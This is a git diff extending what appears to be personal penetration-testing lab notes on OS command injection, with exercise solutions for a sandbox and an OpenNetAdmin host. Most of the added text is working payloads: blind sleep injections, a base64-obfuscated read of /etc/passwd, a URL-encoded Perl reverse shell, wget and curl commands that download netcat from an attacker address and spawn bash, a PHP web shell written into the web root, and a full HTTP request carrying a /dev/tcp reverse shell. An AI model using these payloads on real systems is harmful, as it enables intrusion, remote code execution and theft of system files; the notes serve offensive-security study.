@@ -99,6 +99,8 @@ time curl http://ci-sandbox:80/php/blind.php?ip=127.0.0.1
 
 time curl "http://ci-sandbox:80/php/blind.php?ip=127.0.0.1;sleep%2020"
 
+time curl "http://ci-sandbox:80/php/blind.php?ip=10.10.10.1;sleep%2020;"
+
 ```
 1
 (hacktricks.xyz, 2021), https://book.hacktricks.xyz/pentesting-web/unicode-normalization-vulnerability ↩︎
@@ -109,6 +111,8 @@ sol:
 http://ci-sandbox/php/blocklisted.php?ip=127.0.0.1;`echo%20%22Y2F0IC9ldGMvcGFzc3dkCg==%22%20|base64%20-d`
 
 http://ci-sandbox/php/blocklisted_exercise.php?ip=127.0.0.1$(id)
+
+time curl "http://ci-sandbox:80/php/blind.php?ip=10.10.10.1;sleep%2020;"
 ```
 #### Enumerating Command Injection Capabilities
 
@@ -304,5 +308,90 @@ URL Encoded:
 
 ```
 http://ci-sandbox/nodejs/index.js?ip=127.0.0.1|perl%20-e%20%27use%20Socket%3B%24i%3D%22192.168.49.51%22%3B%24p%3D9090%3Bsocket(S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname(%22tcp%22))%3Bif(connect(S%2Csockaddr_in(%24p%2Cinet_aton(%24i))))%7Bopen(STDIN%2C%22%3E%26S%22)%3Bopen(STDOUT%2C%22%3E%26S%22)%3Bopen(STDERR%2C%22%3E%26S%22)%3Bexec(%22%2Fbin%2Fsh%20-i%22)%3B%7D%3B%27
+
+```
+
+
+#### File Transfer
+
+run which wget to get the location of wget binary.
+
+Payload:
+
+```
+wget http://192.168.49.51:80/nc -O /var/tmp/nc ; chmod 755 /var/tmp/nc ; /var/tmp/nc -nv 192.168.49.51 9090 -e /bin/bash
+
+```
+
+URL encoded payload:
+
+```
+wget%20http://192.168.49.51:80/nc%20-O%20/var/tmp/nc%20;%20chmod%20755%20/var/tmp/nc%20;%20/var/tmp/nc%20-nv%20192.168.49.51%209090%20-e%20/bin/bash
+
+```
+sol:
+```
+http://ci-sandbox/php/file_transfer_exercise.php?ip=127.0.0.1|curl%20http://192.168.49.57:80/nc%20-o%20/var/tmp/nc%20;%20chmod%20755%20/var/tmp/nc%20;%20/var/tmp/nc%20-nv%20192.168.49.57%209090%20-e%20/bin/bash
+```
+
+#### Writing a web shell_exec
+
+```
+http://ci-sandbox:80/php/index.php?ip=127.0.0.1;pwd
+
+
+```
+
+Using echo to write out webshell:
+
+```
+echo+"<pre><?php+passthru(\$_GET['cmd']);+?></pre>"+>+/var/www/html/webshell.php
+```
+
+Writing out webshell:
+
+```
+http://ci-sandbox:80/php/index.php?ip=127.0.0.1;echo+%22%3Cpre%3E%3C?php+passthru(\$_GET[%27cmd%27]);+?%3E%3C/pre%3E%22+%3E+/var/www/html/webshell.php
+
+```
+Webshell confirmation:
+
+```
+http://ci-sandbox:80/webshell.php?cmd=ls -lsa
+
+```
+
+Chaining commands:
+
+```
+cmd=cd/;ls -lsa
+
+```
+World writable files:
+
+/tmp/,
+/var/tmp/,
+/dev/shm/
+
+#### OpenNetAdmin
+
+```
+xajax=window_submit&xajaxr=1679032323339&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E172.24.0.2|id&xajaxargs[]=ping
+
+POST /ona/ HTTP/1.1
+Host: opennetadmin
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Method: POST http://opennetadmin/ona/ HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 112
+Origin: http://opennetadmin
+Connection: close
+Referer: http://opennetadmin/ona/
+Cookie: ona_context_name=DEFAULT; ONA_SESSION_ID=lu6922hseikrrd8uslqvk8ito4
+
+xajax=window_submit&xajaxr=1679032323339&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E172.24.0.2|php%20-r%20%22system(%5C%22bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.49.57%2F9090%200%3E%261%27%5C%22)%3B%22&xajaxargs[]=ping
 
 ```
